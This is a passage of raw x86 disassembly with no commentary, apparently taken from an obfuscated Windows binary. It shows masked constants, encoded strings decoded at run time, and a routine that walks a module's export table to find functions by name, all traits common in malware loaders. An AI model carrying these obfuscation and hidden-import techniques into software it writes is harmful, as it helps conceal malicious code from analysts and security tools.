  427ffb:	mov    edi,DWORD PTR [ebp-0x24]
  427ffe:	mov    ebx,DWORD PTR [ebp-0x10]
  428001:	mov    di,WORD PTR [ebx+edi*2]
  428005:	mov    WORD PTR [ebp+0x8],di
  428009:	mov    edi,DWORD PTR [ebp-0x28]
  42800c:	mov    ebx,DWORD PTR [ebp-0x14]
  42800f:	mov    di,WORD PTR [ebx+edi*2]
  428013:	mov    WORD PTR [ebp-0x4],di
  428017:	mov    edi,DWORD PTR [ebp-0xc]
  42801a:	mov    bx,WORD PTR [ebp+0x8]
  42801e:	xor    edi,esi
  428020:	add    edi,eax
  428022:	cmp    bx,di
  428025:	jne    0x427f3b
  42802b:	mov    eax,DWORD PTR [ebp-0x18]
  42802e:	mov    esi,DWORD PTR [ebp-0xc]
  428031:	xor    eax,ecx
  428033:	add    eax,edx
  428035:	imul   eax,esi
  428038:	mov    DWORD PTR [ebp-0xc],eax
  42803b:	jmp    0x42804f
  42803d:	mov    eax,DWORD PTR [ebp-0xc]
  428040:	mov    esi,DWORD PTR [ebp-0x18]
  428043:	xor    eax,ecx
  428045:	lea    eax,[eax+esi*1+0x3272f5]
  42804c:	mov    DWORD PTR [ebp-0x18],eax
  42804f:	mov    eax,DWORD PTR [ebp-0x24]
  428052:	sub    eax,edx
  428054:	xor    eax,ecx
  428056:	mov    DWORD PTR [ebp-0x30],eax
  428059:	mov    eax,DWORD PTR [ebp-0x28]
  42805c:	sub    eax,edx
  42805e:	xor    eax,ecx
  428060:	mov    DWORD PTR [ebp-0x34],eax
  428063:	mov    eax,DWORD PTR [ebp-0x34]
  428066:	mov    esi,DWORD PTR [ebp-0x1c]
  428069:	xor    esi,ecx
  42806b:	add    esi,edx
  42806d:	xor    eax,ecx
  42806f:	add    eax,0x3272f5
  428074:	imul   esi,eax
  428077:	mov    eax,DWORD PTR [ebp-0x14]
  42807a:	movzx  eax,WORD PTR [esi+eax*1]
  42807e:	mov    esi,DWORD PTR [ebp-0x30]
  428081:	mov    edi,DWORD PTR [ebp-0x1c]
  428084:	xor    esi,ecx
  428086:	add    esi,edx
  428088:	xor    edi,ecx
  42808a:	add    edi,edx
  42808c:	imul   edi,esi
  42808f:	mov    esi,DWORD PTR [ebp-0x10]
  428092:	movzx  esi,WORD PTR [edi+esi*1]
  428096:	sub    eax,edx
  428098:	sub    esi,edx
  42809a:	xor    eax,ecx
  42809c:	xor    esi,ecx
  42809e:	cmp    esi,eax
  4280a0:	jne    0x4280cb
  4280a2:	mov    eax,DWORD PTR [ebp-0x30]
  4280a5:	mov    esi,DWORD PTR [ebp-0x1c]
  4280a8:	xor    eax,ecx
  4280aa:	add    eax,0x3272f5
  4280af:	xor    esi,ecx
  4280b1:	add    esi,edx
  4280b3:	imul   esi,eax
  4280b6:	mov    eax,DWORD PTR [ebp-0x10]
  4280b9:	movzx  eax,WORD PTR [esi+eax*1]
  4280bd:	mov    esi,DWORD PTR [ebp-0xc]
  4280c0:	sub    eax,edx
  4280c2:	xor    eax,ecx
  4280c4:	cmp    eax,esi
  4280c6:	mov    eax,DWORD PTR [ebp-0xc]
  4280c9:	je     0x4280ce
  4280cb:	mov    eax,DWORD PTR [ebp-0x18]
  4280ce:	pop    edi
  4280cf:	xor    eax,ecx
  4280d1:	pop    esi
  4280d2:	add    eax,edx
  4280d4:	pop    ebx
  4280d5:	leave  
  4280d6:	ret    0x8
  4280d9:	push   ebp
  4280da:	mov    ebp,esp
  4280dc:	push   ecx
  4280dd:	mov    cx,WORD PTR [eax]
  4280e0:	push   esi
  4280e1:	mov    esi,0x3b5c
  4280e6:	sub    cx,si
  4280e9:	mov    esi,0x8a9a
  4280ee:	xor    cx,si
  4280f1:	mov    esi,0x4e3e
  4280f6:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  4280fd:	mov    edx,0xf89c85a5
  428102:	cmp    cx,si
  428105:	je     0x428164
  428107:	push   ebx
  428108:	push   edi
  428109:	movzx  ecx,cx
  42810c:	mov    edi,0xffcd8d0b
  428111:	mov    esi,0x75108ae
  428116:	mov    ebx,0x4f9a
  42811b:	cmp    cx,bx
  42811e:	jne    0x428123
  428120:	mov    DWORD PTR [ebp-0x4],edx
  428123:	lea    edx,[edi+0x1]
  428126:	xor    edx,esi
  428128:	mov    edi,edx
  42812a:	xor    edi,esi
  42812c:	mov    cx,WORD PTR [eax+edi*2+0x64e5ea]
  428134:	mov    ebx,0x3b5c
  428139:	sub    cx,bx
  42813c:	mov    ebx,0x8a9a
  428141:	xor    cx,bx
  428144:	mov    ebx,0x4e3e
  428149:	cmp    cx,bx
  42814c:	jne    0x428116
  42814e:	mov    ecx,DWORD PTR [ebp-0x4]
  428151:	pop    edi
  428152:	pop    ebx
  428153:	cmp    ecx,0xf89c85a4
  428159:	je     0x428164
  42815b:	xor    ecx,esi
  42815d:	lea    eax,[eax+ecx*2+0x64e5ec]
  428164:	pop    esi
  428165:	leave  
  428166:	ret    
  428167:	push   ebp
  428168:	mov    ebp,esp
  42816a:	push   ecx
  42816b:	push   esi
  42816c:	push   edi
  42816d:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  428174:	mov    esi,0xf89c85a5
  428179:	call   0x4280d9
  42817e:	mov    edi,eax
  428180:	mov    al,BYTE PTR [edi]
  428182:	sub    al,0x3
  428184:	xor    al,0x7e
  428186:	cmp    al,0x83
  428188:	je     0x4281eb
  42818a:	mov    eax,edi
  42818c:	mov    edx,0xffcd8d0b
  428191:	mov    ecx,0x75108ae
  428196:	push   ebx
  428197:	mov    ax,WORD PTR [eax]
  42819a:	mov    ebx,0x3b5c
  42819f:	sub    ax,bx
  4281a2:	mov    ebx,0x8a9a
  4281a7:	xor    ax,bx
  4281aa:	mov    ebx,0x4e48
  4281af:	cmp    ax,bx
  4281b2:	jne    0x4281b7
  4281b4:	mov    DWORD PTR [ebp-0x4],esi
  4281b7:	lea    esi,[edx+0x1]
  4281ba:	xor    esi,ecx
  4281bc:	mov    edx,esi
  4281be:	xor    edx,ecx
  4281c0:	lea    eax,[edi+edx*2+0x64e5ea]
  4281c7:	mov    bl,BYTE PTR [eax]
  4281c9:	sub    bl,0x3
  4281cc:	xor    bl,0x7e
  4281cf:	cmp    bl,0x83
  4281d2:	jne    0x428197
  4281d4:	mov    eax,DWORD PTR [ebp-0x4]
  4281d7:	pop    ebx
  4281d8:	cmp    eax,0xf89c85a4
  4281dd:	je     0x4281eb
  4281df:	xor    eax,ecx
  4281e1:	xor    ecx,ecx
  4281e3:	mov    WORD PTR [edi+eax*2+0x64e5ea],cx
  4281eb:	mov    eax,edi
  4281ed:	pop    edi
  4281ee:	pop    esi
  4281ef:	leave  
  4281f0:	ret    
  4281f1:	push   ebp
  4281f2:	mov    ebp,esp
  4281f4:	push   ecx
  4281f5:	push   esi
  4281f6:	mov    DWORD PTR [ebp-0x4],0xf89c85a4
  4281fd:	mov    esi,0xf89c85a5
  428202:	call   0x4280d9
  428207:	mov    cx,WORD PTR [eax]
  42820a:	mov    edx,0x3b5c
  42820f:	sub    cx,dx
  428212:	mov    edx,0x8a9a
  428217:	xor    cx,dx
  42821a:	mov    edx,0x4e3e
  42821f:	cmp    cx,dx
  428222:	je     0x42827b
  428224:	push   ebx
  428225:	push   edi
  428226:	movzx  ecx,cx
  428229:	mov    edx,0xffcd8d0b
  42822e:	mov    edi,0x75108ae
  428233:	mov    ebx,0x4e48
  428238:	cmp    cx,bx
  42823b:	jne    0x428240
  42823d:	mov    DWORD PTR [ebp-0x4],esi
  428240:	lea    esi,[edx+0x1]
  428243:	xor    esi,edi
  428245:	mov    edx,esi
  428247:	xor    edx,edi
  428249:	mov    cx,WORD PTR [eax+edx*2+0x64e5ea]
  428251:	mov    ebx,0x3b5c
  428256:	sub    cx,bx
  428259:	mov    ebx,0x8a9a
  42825e:	xor    cx,bx
  428261:	mov    ebx,0x4e3e
  428266:	cmp    cx,bx
  428269:	jne    0x428233
  42826b:	cmp    DWORD PTR [ebp-0x4],0xf89c85a4
  428272:	pop    edi
  428273:	pop    ebx
  428274:	je     0x42827b
  428276:	xor    eax,eax
  428278:	inc    eax
  428279:	jmp    0x42827d
  42827b:	xor    eax,eax
  42827d:	pop    esi
  42827e:	leave  
  42827f:	ret    
  428280:	push   ebp
  428281:	mov    ebp,esp
  428283:	push   ecx
  428284:	mov    eax,DWORD PTR [ebp+0x8]
  428287:	movzx  ecx,WORD PTR [eax]
  42828a:	push   esi
  42828b:	lea    eax,[ecx-0x3b5c]
  428291:	mov    esi,0x8a9a
  428296:	push   edi
  428297:	xor    eax,esi
  428299:	mov    edi,0x4e3e
  42829e:	mov    DWORD PTR [ebp-0x4],edx
  4282a1:	cmp    ax,di
  4282a4:	je     0x4282d1
  4282a6:	mov    eax,DWORD PTR [ebp+0x8]
  4282a9:	sub    eax,edx
  4282ab:	mov    DWORD PTR [ebp+0x8],eax
  4282ae:	jmp    0x4282b3
  4282b0:	mov    eax,DWORD PTR [ebp+0x8]
  4282b3:	mov    WORD PTR [edx],cx
  4282b6:	add    edx,0x2
  4282b9:	movzx  edi,WORD PTR [eax+edx*1]
  4282bd:	mov    ecx,edi
  4282bf:	add    edi,0xffffc4a4
  4282c5:	xor    edi,esi
  4282c7:	mov    eax,0x4e3e
  4282cc:	cmp    di,ax
  4282cf:	jne    0x4282b0
  4282d1:	xor    eax,eax
  4282d3:	pop    edi
  4282d4:	mov    WORD PTR [edx],ax
  4282d7:	mov    eax,DWORD PTR [ebp-0x4]
  4282da:	pop    esi
  4282db:	leave  
  4282dc:	ret    0x4
  4282df:	push   ebp
  4282e0:	mov    ebp,esp
  4282e2:	sub    esp,0x18
  4282e5:	mov    DWORD PTR [ebp-0x8],0xf89c85a5
  4282ec:	mov    DWORD PTR [ebp-0x18],0xf89c85a2
  4282f3:	mov    ecx,DWORD PTR [ebp-0x8]
  4282f6:	push   esi
  4282f7:	mov    eax,0x75108ae
  4282fc:	xor    ecx,eax
  4282fe:	mov    esi,0x3272f5
  428303:	add    ecx,esi
  428305:	mov    DWORD PTR [ebp-0x4],ecx
  428308:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42830f:	mov    DWORD PTR [ebp-0x10],0xf89c85a1
  428316:	push   edi
  428317:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  42831e:	jmp    0x4283bf
  428323:	mov    ecx,DWORD PTR [ebp-0x4]
  428326:	mov    edx,DWORD PTR [ebp+0x10]
  428329:	sub    edx,ecx
  42832b:	mov    ecx,DWORD PTR [ebp-0xc]
  42832e:	xor    ecx,eax
  428330:	add    ecx,esi
  428332:	cmp    edx,ecx
  428334:	jbe    0x428351
  428336:	mov    edx,DWORD PTR [ebp-0x4]
  428339:	add    edx,DWORD PTR [ebp+0x8]
  42833c:	mov    ecx,DWORD PTR [ebp-0x4]
  42833f:	add    ecx,DWORD PTR [ebp+0xc]
  428342:	mov    edi,DWORD PTR [ecx]
  428344:	mov    DWORD PTR [edx],edi
  428346:	mov    ecx,DWORD PTR [ecx+0x4]
  428349:	mov    DWORD PTR [edx+0x4],ecx
  42834c:	mov    ecx,DWORD PTR [ebp-0xc]
  42834f:	jmp    0x42839e
  428351:	mov    ecx,DWORD PTR [ebp-0x4]
  428354:	mov    edx,DWORD PTR [ebp+0x10]
  428357:	sub    edx,ecx
  428359:	mov    ecx,DWORD PTR [ebp-0x10]
  42835c:	xor    ecx,eax
  42835e:	add    ecx,esi
  428360:	cmp    edx,ecx
  428362:	mov    ecx,DWORD PTR [ebp-0x4]
  428365:	jbe    0x428379
  428367:	add    ecx,DWORD PTR [ebp+0x8]
  42836a:	mov    edx,DWORD PTR [ebp-0x4]
  42836d:	add    edx,DWORD PTR [ebp+0xc]
  428370:	mov    edx,DWORD PTR [edx]
  428372:	mov    DWORD PTR [ecx],edx
  428374:	mov    ecx,DWORD PTR [ebp-0x10]
  428377:	jmp    0x42839e
  428379:	mov    edx,DWORD PTR [ebp+0x10]
  42837c:	sub    edx,ecx
  42837e:	mov    ecx,DWORD PTR [ebp-0x14]
  428381:	xor    ecx,eax
  428383:	add    ecx,esi
  428385:	cmp    edx,ecx
  428387:	mov    ecx,DWORD PTR [ebp-0x4]
  42838a:	jbe    0x4283af
  42838c:	add    ecx,DWORD PTR [ebp+0x8]
  42838f:	mov    edx,DWORD PTR [ebp-0x4]
  428392:	add    edx,DWORD PTR [ebp+0xc]
  428395:	mov    dx,WORD PTR [edx]
  428398:	mov    WORD PTR [ecx],dx
  42839b:	mov    ecx,DWORD PTR [ebp-0x14]
  42839e:	mov    edx,DWORD PTR [ebp-0x4]
  4283a1:	xor    ecx,eax
  4283a3:	lea    ecx,[ecx+edx*1+0x3272f5]
  4283aa:	mov    DWORD PTR [ebp-0x4],ecx
  4283ad:	jmp    0x4283bf
  4283af:	add    ecx,DWORD PTR [ebp+0x8]
  4283b2:	mov    edx,DWORD PTR [ebp-0x4]
  4283b5:	add    edx,DWORD PTR [ebp+0xc]
  4283b8:	mov    dl,BYTE PTR [edx]
  4283ba:	mov    BYTE PTR [ecx],dl
  4283bc:	inc    DWORD PTR [ebp-0x4]
  4283bf:	mov    ecx,DWORD PTR [ebp-0x18]
  4283c2:	mov    edx,DWORD PTR [ebp+0x10]
  4283c5:	xor    ecx,eax
  4283c7:	add    ecx,esi
  4283c9:	imul   ecx,edx
  4283cc:	mov    edx,DWORD PTR [ebp-0x8]
  4283cf:	mov    edi,DWORD PTR [ebp-0x4]
  4283d2:	xor    edx,eax
  4283d4:	lea    edx,[edx+edi*1+0x3272f5]
  4283db:	cmp    edx,ecx
  4283dd:	jb     0x428323
  4283e3:	pop    edi
  4283e4:	pop    esi
  4283e5:	leave  
  4283e6:	ret    0xc
  4283e9:	push   ebp
  4283ea:	mov    ebp,esp
  4283ec:	sub    esp,0xc
  4283ef:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  4283f6:	push   esi
  4283f7:	mov    esi,eax
  4283f9:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  428400:	mov    edx,DWORD PTR [ebp-0x4]
  428403:	mov    eax,0x75108ae
  428408:	xor    edx,eax
  42840a:	mov    ecx,0x3272f5
  42840f:	add    edx,ecx
  428411:	cmp    esi,edx
  428413:	je     0x428455
  428415:	push   ebx
  428416:	push   edi
  428417:	mov    edx,DWORD PTR [ebp-0x8]
  42841a:	mov    ebx,DWORD PTR [ebp+0x8]
  42841d:	xor    edx,eax
  42841f:	mov    edi,0xffcd8d0b
  428424:	sub    edi,edx
  428426:	add    esi,edi
  428428:	lea    edx,[esi-0x3272f5]
  42842e:	xor    edx,eax
  428430:	mov    DWORD PTR [ebp-0xc],edx
  428433:	mov    edx,DWORD PTR [ebp-0x4]
  428436:	mov    edi,DWORD PTR [ebp-0xc]
  428439:	xor    dl,0xae
  42843c:	sub    dl,0xb
  42843f:	xor    edi,eax
  428441:	mov    BYTE PTR [edi+ebx*1+0x3272f5],dl
  428448:	mov    edx,DWORD PTR [ebp-0x4]
  42844b:	xor    edx,eax
  42844d:	add    edx,ecx
  42844f:	cmp    esi,edx
  428451:	jne    0x428417
  428453:	pop    edi
  428454:	pop    ebx
  428455:	pop    esi
  428456:	leave  
  428457:	ret    0x4
  42845a:	push   ebp
  42845b:	mov    ebp,esp
  42845d:	sub    esp,0x21c
  428463:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  42846a:	mov    DWORD PTR [ebp-0x14],0xf89c85a2
  428471:	mov    eax,DWORD PTR [ebp+0x10]
  428474:	mov    eax,DWORD PTR [ebp-0x4]
  428477:	mov    ecx,DWORD PTR [ebp+0x8]
  42847a:	push   esi
  42847b:	push   edi
  42847c:	mov    edi,0x75108ae
  428481:	xor    eax,edi
  428483:	mov    esi,0x3272f5
  428488:	add    eax,esi
  42848a:	cmp    eax,ecx
  42848c:	mov    eax,DWORD PTR [ebp-0x4]
  42848f:	jne    0x42849a
  428491:	xor    eax,edi
  428493:	add    eax,esi
  428495:	jmp    0x428546
  42849a:	mov    ecx,DWORD PTR [ebp+0xc]
  42849d:	xor    eax,edi
  42849f:	add    eax,esi
  4284a1:	cmp    eax,ecx
  4284a3:	jne    0x4284aa
  4284a5:	mov    eax,DWORD PTR [ebp-0x4]
  4284a8:	jmp    0x428491
  4284aa:	lea    eax,[ebp-0x21c]
  4284b0:	mov    DWORD PTR [ebp-0x8],eax
  4284b3:	mov    eax,DWORD PTR [ebp+0xc]
  4284b6:	mov    DWORD PTR [ebp-0x10],eax
  4284b9:	mov    eax,DWORD PTR [ebp-0x4]
  4284bc:	xor    eax,edi
  4284be:	add    eax,esi
  4284c0:	mov    DWORD PTR [ebp+0x10],eax
  4284c3:	mov    eax,DWORD PTR [ebp+0xc]
  4284c6:	push   ebx
  4284c7:	call   0x4281f1
  4284cc:	mov    ebx,eax
  4284ce:	mov    eax,DWORD PTR [ebp+0x8]
  4284d1:	mov    eax,DWORD PTR [eax+0x14]
  4284d4:	jmp    0x42852e
  4284d6:	mov    eax,DWORD PTR [ebp+0xc]
  4284d9:	sub    eax,0x8
  4284dc:	mov    DWORD PTR [ebp-0xc],eax
  4284df:	mov    eax,DWORD PTR [ebp-0xc]
  4284e2:	mov    eax,DWORD PTR [eax+0x28]
  4284e5:	call   0x4280d9
  4284ea:	mov    DWORD PTR [ebp+0x10],eax
  4284ed:	push   DWORD PTR [ebp+0x10]
  4284f0:	mov    edx,DWORD PTR [ebp-0x8]
  4284f3:	call   0x428280
  4284f8:	mov    eax,DWORD PTR [ebp-0x4]
  4284fb:	xor    eax,edi
  4284fd:	add    eax,esi
  4284ff:	cmp    eax,ebx
  428501:	jne    0x42850b
  428503:	mov    eax,DWORD PTR [ebp-0x8]
  428506:	call   0x428167
  42850b:	mov    eax,DWORD PTR [ebp-0x14]
  42850e:	xor    eax,edi
  428510:	add    eax,esi
  428512:	push   eax
  428513:	push   DWORD PTR [ebp-0x10]
  428516:	mov    eax,DWORD PTR [ebp-0x8]
  428519:	call   0x427e93
  42851e:	mov    ecx,DWORD PTR [ebp-0x4]
  428521:	xor    ecx,edi
  428523:	add    ecx,esi
  428525:	cmp    eax,ecx
  428527:	je     0x42854c
  428529:	mov    eax,DWORD PTR [ebp+0xc]
  42852c:	mov    eax,DWORD PTR [eax]
  42852e:	mov    DWORD PTR [ebp+0xc],eax
  428531:	mov    eax,DWORD PTR [ebp+0x8]
  428534:	mov    ecx,DWORD PTR [ebp+0xc]
  428537:	add    eax,0x14
  42853a:	cmp    ecx,eax
  42853c:	jne    0x4284d6
  42853e:	mov    eax,DWORD PTR [ebp-0x4]
  428541:	xor    eax,edi
  428543:	add    eax,esi
  428545:	pop    ebx
  428546:	pop    edi
  428547:	pop    esi
  428548:	leave  
  428549:	ret    0xc
  42854c:	mov    eax,DWORD PTR [ebp-0xc]
  42854f:	mov    eax,DWORD PTR [eax+0x18]
  428552:	jmp    0x428545
  428554:	push   ebp
  428555:	mov    ebp,esp
  428557:	mov    eax,DWORD PTR [ebp+0xc]
  42855a:	sub    esp,0x10
  42855d:	cmp    DWORD PTR [ebp+0x8],0x0
  428561:	push   ebx
  428562:	push   esi
  428563:	push   edi
  428564:	je     0x428619
  42856a:	test   eax,eax
  42856c:	je     0x428619
  428572:	movzx  eax,WORD PTR [eax+0x20]
  428576:	mov    ecx,eax
  428578:	mov    DWORD PTR [ebp-0x10],eax
  42857b:	xor    edx,edx
  42857d:	and    DWORD PTR [ebp-0x8],edx
  428580:	mov    eax,0x8a9a
  428585:	xor    ecx,eax
  428587:	add    ecx,0x3b5c
  42858d:	mov    DWORD PTR [ebp-0xc],ecx
  428590:	and    DWORD PTR [ebp-0x4],0x0
  428594:	xor    ecx,ecx
  428596:	push   0xffffff81
  428598:	pop    edi
  428599:	cmp    cx,WORD PTR [ebp-0xc]
  42859d:	jae    0x428603
  42859f:	lea    esi,[edx-0x3b5c]
  4285a5:	xor    esi,eax
  4285a7:	movzx  ecx,WORD PTR [ebp-0x4]
  4285ab:	mov    ebx,DWORD PTR [ebp+0xc]
  4285ae:	lea    ecx,[ebx+ecx*4]
  4285b1:	cmp    WORD PTR [ecx+0x2],si
  4285b5:	jne    0x4285ee
  4285b7:	movzx  ecx,WORD PTR [ecx]
  4285ba:	mov    edi,0x4e3e
  4285bf:	cmp    cx,di
  4285c2:	jne    0x4285d0
  4285c4:	mov    ebx,DWORD PTR [ebp+0x8]
  4285c7:	movzx  edi,dx
  4285ca:	cmp    BYTE PTR [edi+ebx*1],0x0
  4285ce:	je     0x4285fd
  4285d0:	mov    ebx,DWORD PTR [ebp+0x8]
  4285d3:	movzx  edi,dx
  4285d6:	movsx  di,BYTE PTR [edi+ebx*1]
  4285db:	mov    ebx,0x3b5c
  4285e0:	sub    di,bx
  4285e3:	xor    di,ax
  4285e6:	cmp    cx,di
  4285e9:	je     0x4285fd
  4285eb:	push   0xffffff83
  4285ed:	pop    edi
  4285ee:	inc    DWORD PTR [ebp-0x4]
  4285f1:	mov    cx,WORD PTR [ebp-0xc]
  4285f5:	cmp    WORD PTR [ebp-0x4],cx
  4285f9:	jb     0x4285a7
  4285fb:	jmp    0x428603
  4285fd:	inc    DWORD PTR [ebp-0x8]
  428600:	push   0xffffff80
  428602:	pop    edi
  428603:	mov    esi,DWORD PTR [ebp+0x8]
  428606:	movzx  ecx,dx
  428609:	cmp    BYTE PTR [ecx+esi*1],0x0
  42860d:	je     0x428622
  42860f:	inc    edx
  428610:	cmp    edi,0xffffff83
  428613:	jne    0x428590
  428619:	xor    eax,eax
  42861b:	pop    edi
  42861c:	pop    esi
  42861d:	pop    ebx
  42861e:	leave  
  42861f:	ret    0x8
  428622:	mov    ecx,DWORD PTR [ebp-0x8]
  428625:	add    ecx,0xffffc4a4
  42862b:	xor    cx,ax
  42862e:	xor    eax,eax
  428630:	cmp    cx,WORD PTR [ebp-0x10]
  428634:	sete   al
  428637:	jmp    0x42861b
  428639:	push   ebp
  42863a:	mov    ebp,esp
  42863c:	sub    esp,0x50
  42863f:	push   edi
  428640:	mov    edi,eax
  428642:	mov    eax,DWORD PTR [edi+0x1a8]
  428648:	cmp    DWORD PTR [eax],0x0
  42864b:	jne    0x428654
  42864d:	xor    eax,eax
  42864f:	jmp    0x428785
  428654:	push   DWORD PTR [ebp+0x8]
  428657:	push   0x2c
  428659:	pop    eax
  42865a:	call   0x4283e9
  42865f:	mov    edx,DWORD PTR [edi+0x1ac]
  428665:	lea    eax,[edi+0x22]
  428668:	mov    DWORD PTR [ebp-0x4c],eax
  42866b:	lea    eax,[edi+0x44]
  42866e:	mov    DWORD PTR [ebp-0x48],eax
  428671:	lea    eax,[edi+0x66]
  428674:	mov    DWORD PTR [ebp-0x44],eax
  428677:	lea    eax,[edi+0x88]
  42867d:	mov    DWORD PTR [ebp-0x40],eax
  428680:	lea    eax,[edi+0xaa]
  428686:	mov    DWORD PTR [ebp-0x3c],eax
  428689:	lea    eax,[edi+0xcc]
  42868f:	mov    DWORD PTR [ebp-0x38],eax
  428692:	lea    eax,[edi+0xee]
  428698:	mov    DWORD PTR [ebp-0x34],eax
  42869b:	lea    eax,[edi+0x110]
  4286a1:	mov    DWORD PTR [ebp-0x30],eax
  4286a4:	lea    eax,[edi+0x132]
  4286aa:	mov    DWORD PTR [ebp-0x2c],eax
  4286ad:	lea    eax,[edi+0x154]
  4286b3:	push   edi
  4286b4:	mov    DWORD PTR [ebp-0x50],edi
  4286b7:	mov    DWORD PTR [ebp-0x28],eax
  4286ba:	call   0x4287b9
  4286bf:	push   eax
  4286c0:	mov    eax,DWORD PTR [edi+0x1a8]
  4286c6:	push   DWORD PTR [eax]
  4286c8:	call   0x42845a
  4286cd:	mov    DWORD PTR [ebp-0x10],eax
  4286d0:	test   eax,eax
  4286d2:	je     0x428785
  4286d8:	mov    ecx,DWORD PTR [eax+0x3c]
  4286db:	push   ebx
  4286dc:	push   esi
  4286dd:	mov    esi,DWORD PTR [ecx+eax*1+0x78]
  4286e1:	add    esi,eax
  4286e3:	mov    edi,DWORD PTR [esi+0x24]
  4286e6:	mov    ecx,DWORD PTR [esi+0x1c]
  4286e9:	mov    edx,DWORD PTR [esi+0x20]
  4286ec:	mov    ebx,DWORD PTR [esi+0x18]
  4286ef:	add    edi,eax
  4286f1:	mov    DWORD PTR [ebp-0x20],edi
  4286f4:	mov    edi,DWORD PTR [esi+0x14]
  4286f7:	add    ecx,eax
  4286f9:	add    edx,eax
  4286fb:	mov    DWORD PTR [ebp-0xc],ecx
  4286fe:	mov    DWORD PTR [ebp-0x1c],edx
  428701:	mov    DWORD PTR [ebp-0x8],edi
  428704:	cmp    edi,ebx
  428706:	ja     0x42870b
  428708:	mov    DWORD PTR [ebp-0x8],ebx
  42870b:	xor    ebx,ebx
  42870d:	mov    DWORD PTR [ebp-0x18],ebx
  428710:	cmp    DWORD PTR [ebp-0x8],ebx
  428713:	jbe    0x428783
  428715:	jmp    0x42871a
  428717:	mov    edx,DWORD PTR [ebp-0x1c]
  42871a:	mov    edi,DWORD PTR [ebp-0x20]
  42871d:	movzx  edi,WORD PTR [edi+ebx*2]
  428721:	cmp    ebx,DWORD PTR [esi+0x18]
  428724:	jae    0x428783
  428726:	cmp    edi,DWORD PTR [esi+0x14]
  428729:	jae    0x428783
  42872b:	mov    ebx,DWORD PTR [edx+ebx*4]
  42872e:	mov    edx,DWORD PTR [ebp+0x8]
  428731:	mov    edi,DWORD PTR [ecx+edi*4]
  428734:	mov    DWORD PTR [ebp-0x4],edx
  428737:	lea    edx,[ebp-0x50]
  42873a:	add    ebx,eax
  42873c:	add    edi,eax
  42873e:	sub    edx,DWORD PTR [ebp+0x8]
  428741:	mov    DWORD PTR [ebp-0x14],0xb
  428748:	mov    DWORD PTR [ebp-0x24],edx
  42874b:	mov    edx,DWORD PTR [ebp-0x4]
  42874e:	cmp    DWORD PTR [edx],0x0
  428751:	jne    0x42876e
  428753:	mov    eax,DWORD PTR [ebp-0x24]
  428756:	push   DWORD PTR [eax+edx*1]
  428759:	push   ebx
  42875a:	call   0x428554
  42875f:	mov    ecx,DWORD PTR [ebp-0xc]
  428762:	test   eax,eax
  428764:	je     0x42876b
  428766:	mov    eax,DWORD PTR [ebp-0x4]
  428769:	mov    DWORD PTR [eax],edi
  42876b:	mov    eax,DWORD PTR [ebp-0x10]
  42876e:	add    DWORD PTR [ebp-0x4],0x4
  428772:	dec    DWORD PTR [ebp-0x14]
  428775:	jne    0x42874b
  428777:	mov    ebx,DWORD PTR [ebp-0x18]
  42877a:	inc    ebx
  42877b:	mov    DWORD PTR [ebp-0x18],ebx
  42877e:	cmp    ebx,DWORD PTR [ebp-0x8]
  428781:	jb     0x428717
  428783:	pop    esi
  428784:	pop    ebx
  428785:	pop    edi
  428786:	leave  
  428787:	ret    0x4
  42878a:	push   ebp
  42878b:	mov    ebp,esp
  42878d:	mov    eax,DWORD PTR [ebp+0x8]
  428790:	push   esi
  428791:	push   DWORD PTR [eax+0x1e0]
  428797:	lea    esi,[eax+0x198]
  42879d:	mov    eax,DWORD PTR [ebp+0x8]
  4287a0:	call   0x428639
  4287a5:	mov    ecx,DWORD PTR [esi]
  4287a7:	mov    DWORD PTR [ecx],eax
  4287a9:	mov    eax,DWORD PTR [esi]
  4287ab:	xor    ecx,ecx
  4287ad:	cmp    DWORD PTR [eax],ecx
  4287af:	pop    esi
  4287b0:	setne  cl
  4287b3:	mov    eax,ecx
  4287b5:	pop    ebp
  4287b6:	ret    0x4
  4287b9:	mov    ecx,DWORD PTR [edi+0x188]
  4287bf:	push   ebx
  4287c0:	jmp    0x4287d5
  4287c2:	xor    eax,0x8a9a
  4287c7:	add    eax,0x3b5c
  4287cc:	mov    WORD PTR [ecx],ax
  4287cf:	add    ecx,0x2
  4287d2:	add    edx,0x2
  4287d5:	movzx  eax,WORD PTR [edx]
  4287d8:	mov    ebx,0x4e3e
  4287dd:	cmp    ax,bx
  4287e0:	jne    0x4287c2
  4287e2:	xor    eax,eax
  4287e4:	mov    WORD PTR [ecx],ax
  4287e7:	mov    eax,DWORD PTR [edi+0x188]
  4287ed:	pop    ebx
  4287ee:	ret    
  4287ef:	push   edi
  4287f0:	mov    edi,eax
  4287f2:	mov    eax,DWORD PTR [esi+0x188]
  4287f8:	shl    edi,0x6
  4287fb:	add    eax,edi
  4287fd:	jmp    0x428809
  4287ff:	xor    cl,0x7e
  428802:	add    cl,0x3
  428805:	mov    BYTE PTR [eax],cl
  428807:	inc    eax
  428808:	inc    edx
  428809:	mov    cl,BYTE PTR [edx]
  42880b:	cmp    cl,0x83
  42880e:	jne    0x4287ff
  428810:	mov    BYTE PTR [eax],0x0
  428813:	mov    eax,DWORD PTR [esi+0x188]
  428819:	add    eax,edi
  42881b:	pop    edi
  42881c:	ret    
  42881d:	push   ebp
  42881e:	mov    ebp,esp
  428820:	sub    esp,0x14
  428823:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  42882a:	mov    DWORD PTR [ebp-0x4],0xf89c85a2
  428831:	mov    eax,DWORD PTR [ebx]
  428833:	mov    DWORD PTR [ebp-0x8],eax
  428836:	mov    DWORD PTR [ebp-0xc],0xf89c85bd
  42883d:	push   esi
  42883e:	push   edi
  42883f:	mov    DWORD PTR [ebp-0x14],0xead71885
  428846:	mov    edi,DWORD PTR [ebp-0x4]
  428849:	mov    ecx,DWORD PTR [ebp-0x10]
  42884c:	mov    eax,0x75108ae
  428851:	xor    edi,eax
  428853:	mov    edx,0x3272f5
  428858:	xor    ecx,eax
  42885a:	add    edi,edx
  42885c:	add    ecx,edx
  42885e:	imul   edi,ecx
  428861:	jmp    0x4288a9
  428863:	mov    ecx,DWORD PTR [ebp-0x8]
  428866:	mov    esi,DWORD PTR [ebp-0x4]
  428869:	xor    ecx,eax
  42886b:	xor    esi,eax
